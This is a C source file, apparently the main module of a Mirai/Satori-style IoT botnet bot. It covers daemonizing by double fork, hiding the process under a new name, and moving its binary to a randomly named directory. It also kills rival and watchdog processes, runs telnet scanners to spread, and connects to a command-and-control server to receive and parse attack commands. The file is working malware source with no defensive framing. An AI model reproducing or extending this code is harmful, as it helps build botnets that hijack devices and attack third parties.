#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#ifdef SATORI_KILL
#include "headers/killer.h"
#endif
#include "headers/util.h"
#include "headers/includes.h"
#include "headers/command.h"
#include "headers/entry.h"
#include "headers/rand.h"
#ifdef SATORI_WD
#include "headers/watch.h"
#endif
#ifdef SATORI_SCAN
#include "headers/tel.h"
#endif
#include "headers/resolve.h"


int main_pid1 = 0;
int main_pid2 = 0;
int watch_pid = 0;
int killer_pid = 0;
int tel_pid = 0;

static int fd = -1;
static int tfd = -1;
char connected = FALSE;

#ifdef SATORI_SCAN
static void call_appropriate_scanner(void)
{
    switch(GET_UID)
    {
        case 0:
        {
            telnet_scan_root();
        }
        break;
        default:
        {
            telnet_scan_noroot();
        }
        break;
    }
    
    return;
}
#endif

void hide_maps_proc()
{
    int fd = 0, ret = 0;
    char buffer[512], exe_path[64], *ptr_exe_path = exe_path;
    unlock_entry(TABLE_KILLER_PROC);
    unlock_entry(TABLE_KILLER_EXE);
    ptr_exe_path += sprintf(ptr_exe_path, "%s", retrieve_entry(TABLE_KILLER_PROC));
    ptr_exe_path += sprintf(ptr_exe_path, "%d", getpid());
    ptr_exe_path += sprintf(ptr_exe_path, "%s", retrieve_entry(TABLE_KILLER_EXE));
    lock_entry(TABLE_KILLER_PROC);
    lock_entry(TABLE_KILLER_EXE);
    if(fd = open(exe_path, O_RDONLY) == -1)
    {
        return;
    }
    while(ret = readlink(exe_path, buffer, sizeof buffer) > 0) 
    {
        char command[128];
        char name_buf[32];
        int name_buf_len = 10;
        memset(name_buf, 0, sizeof(name_buf));
        rand_string(name_buf, name_buf_len);
        sprintf(command, "mkdir /%s/ && >/%s/%s && cd /%s/ >/dev/null", name_buf, name_buf, name_buf, name_buf);
        system(command);
        sprintf(command, "mv %s /%s/%s && chmod 777 /%s/%s >/dev/null", buffer, name_buf, name_buf, name_buf, name_buf);
        system(command);
        break;             
    }
    close(fd);
    return;
}

static void establish_connection(void)
{
    #ifdef DEBUG
        printf("[main] Attempting to connect to CNC\n");
    #endif

    struct sockaddr_in addr;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd == -1)
        return;

    fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5683);
    addr.sin_addr.s_addr = INET_ADDR(1,1,1,1);

    connect(fd, &addr, sizeof(addr));
}

static void disconnect_connection(void)
{
    #ifdef DEBUG
        printf("[main] Tearing down connection to CNC!\n");
    #endif
    if(fd != -1)
        close(fd);
    fd = -1;
    connected = FALSE;
    sleep(1);
}

static void flush_relay(struct relay *ptr)
{
    ptr->type = 0;

    ptr->b1 = 0;
    ptr->b2 = 0;
    ptr->b3 = 0;
    ptr->b4 = 0;
    ptr->b5 = 0;
    ptr->b6 = 0;

    memset(ptr->buf, 0, sizeof(ptr->buf));

    return;
}

static void build_auth(struct relay *data, char *ptr)
{
    char arch[64];
    uint16_t arch_len = 0;

    flush_relay(data);

    data->type = TYPE_AUTH;

    data->b1 = htons(66);
    data->b2 = htons(51);
    data->b3 = htons(99);
    data->b4 = htons(456);
    data->b5 = htons(764);
    data->b6 = htons(73);

    if(strlen(ptr) > 0)
    {
        util_strcpy(arch, ptr);
    }

    if(strlen(ptr) == 0)
    {
        util_strcpy(arch, "rce");
    }

    arch_len = strlen(arch);
    arch_len = htons(arch_len);

    util_memcpy(data->buf, &arch_len, sizeof(uint16_t));
    util_memcpy(data->buf + sizeof(uint16_t), arch, ntohs(arch_len));

    return;
}

static void send_query(void)
{
    struct relay data;

    flush_relay(&data);

    data.type = TYPE_COMMAND;

    data.b1 = htons(6967);
    data.b2 = htons(1011);
    data.b3 = htons(9699);
    data.b4 = htons(6464);
    data.b5 = htons(7784);
    data.b6 = htons(6866);

    send(fd, &data, sizeof(struct relay), MSG_NOSIGNAL);

    return;
}

int main(int argc, char **args)
{
    int p = 0;
    int i = 0;
    struct relay auth;
    int len = 0;
    char ident[64];
    char *state_str;

    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    util_null(ident, 0, sizeof(ident));

    if(argc == 2 && util_strlen(args[1]) < sizeof(ident)) // Parse the input on arg1
    {
        util_strcpy(ident, args[1]);
    }

    LOCAL_ADDRESS = util_get_local_address();

    init_rand();
    init_entrys();

    unlock_entry(TABLE_DEPLOY_STRING);
    state_str = retrieve_entry(TABLE_DEPLOY_STRING);
    write(STDOUT, state_str, util_strlen(state_str));
    write(STDOUT, "\n", 1);
    lock_entry(TABLE_DEPLOY_STRING);
    /*
    #ifndef DEBUG
        if(fork() > 0)
        {
            return 0;
        }
        close(STDIN);
        close(STDERR);
        close(STDOUT);
    #endif
    */
    #ifdef DEBUG
        printf("[main] Deployed\n");
    #endif
    #ifndef DEBUG
        // Fork ourselfs into the background we double fork to create a daemon and detach ourselves from running terminals.
		main_pid1 = fork();
		if(main_pid1)
		{
			exit(1);
		}
		main_pid2 = fork();
		if(main_pid2)
		{
			exit(1);
		}
    	close(STDIN);
    	close(STDOUT);
    	close(STDERR);
    #endif
    #ifndef DEBUG
    int main_uid = getuid();
    if(main_uid == 0)
    {
        hide_maps_proc();
    }
    #endif
    for(i = 0; i < argc; i++)
    {
        util_null(args[i], 0, util_strlen(args[i]));
    }

    unlock_entry(TABLE_HIDE);
    char *h = retrieve_entry(TABLE_HIDE);
    util_strcpy(args[0], h);
    prctl(util_strlen(h), h);
    lock_entry(TABLE_HIDE);

    init_commands();
	#ifdef SATORI_KILL
        kill_bad_processes();
	#endif
    #ifdef SATORI_WD
        find_watchdog_driver("/dev");
    #endif
	#ifdef SATORI_SCAN
        call_appropriate_scanner();
	#endif
    build_auth(&auth, ident);

    #ifdef DEBUG
        printf("[main] Auth built and proc hidden\n");
    #endif

    while(TRUE)
    {
        fd_set read_set;
        fd_set write_set;
        struct timeval timeout;
        int ret = 0;
        int max_fds = 0;

        FD_ZERO(&read_set);
        FD_ZERO(&write_set);

        if(tfd != -1)
        {
            FD_SET(tfd, &read_set);
        }

        if(fd == -1)
        {
            establish_connection();
        }

        // Check if the socket was correctly initialized
        if(fd == -1)
        {
            p = 0;
            disconnect_connection();
            continue;
        }

        if(errno == ENETUNREACH || errno == EINVAL)
        {
            p = 0;
            disconnect_connection();
            continue;
        }

        FD_SET(fd, (connected ? &read_set : &write_set));

        max_fds = (tfd > fd ? tfd : fd);

        timeout.tv_usec = 0;
        timeout.tv_sec = 10;

        ret = select(max_fds + 1, &read_set, &write_set, NULL, &timeout);
        if(ret == -1)
        {
            continue;
        }

        if(ret == 0)
        {
            p++;
            if(p == 6)
            {
                p = 0;
                #ifdef DEBUG
                    printf("[main] sending query\n");
                #endif
                send_query();
            }
        }
        
        if(FD_ISSET(tfd, &read_set) && tfd != -1)
        {
            int tmp = -1;
            struct sockaddr_in taddr;
            socklen_t taddr_len = sizeof(taddr);

            tmp = accept(tfd, (struct sockaddr *)&taddr, &taddr_len); // Accept the connection
            #ifdef DEBUG
                printf("[main] Killing self\n");
            #endif
            #ifdef SATORI_KILL
                kill_killer();
            #endif

            #ifdef SATORI_WD
                kill_watchdog_maintainer();
            #endif
			#ifdef SATORI_SCAN
			kill_scanners();
			#endif
            close(tmp);
            close(tfd);
            kill(main_pid1, SIGKILL);
            kill(main_pid2, SIGKILL);
            exit(0);
        }
        
        if(FD_ISSET(fd, &write_set))
        {
            int err = 0;
            socklen_t err_len = sizeof(err);

            getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
            if(err)
            {
                #ifdef DEBUG
                    printf("[main] Failed to connect to CNC\n");
                #endif
                p = 0;
                disconnect_connection();
                continue;
            }

            send(fd, &auth, sizeof(struct relay), MSG_NOSIGNAL);
            connected = TRUE;
        }

        if(!connected)
        {
            p = 0;
            disconnect_connection();
            continue;
        }

        if(FD_ISSET(fd, &read_set))
        {
            uint8_t tmp = 0;
            struct relay data;

            errno = 0;
            ret = recv(fd, &tmp, sizeof(uint8_t), MSG_NOSIGNAL | MSG_PEEK);
            if(ret == -1)
            {
                // Determine if the resource was temporarily unavailable before we conclude a definite error
                if(errno == EINTR || errno == EWOULDBLOCK || errno == EAGAIN)
                {
                    continue;
                }
                ret = 0;
            }

            if(ret == 0)
            {
                p = 0;
                disconnect_connection();
                continue;
            }

            // Actually receive in the data
            ret = recv(fd, &data, sizeof(struct relay), MSG_NOSIGNAL);
            if(ret == 0)
            {
                continue;
            }

            // Adventually parse the command data
            if(data.type == TYPE_COMMAND)
            {
                continue;
            }

            // Stop ourself?
            if(data.type == TYPE_KILL)
            {

                #ifdef SATORI_SCAN
                    kill_killer();
                #endif

                #ifdef SATORI_WD
                    kill_watchdog_maintainer();
                #endif
			    #ifdef SATORI_SCAN
                    kill_scanners();
				#endif
                close(tmp);
                close(tfd);
                kill(main_pid1, SIGKILL);
                kill(main_pid2, SIGKILL);
                exit(0);
            }
            command_parse(data.buf, ret);
        }
    }
    return 0;
}
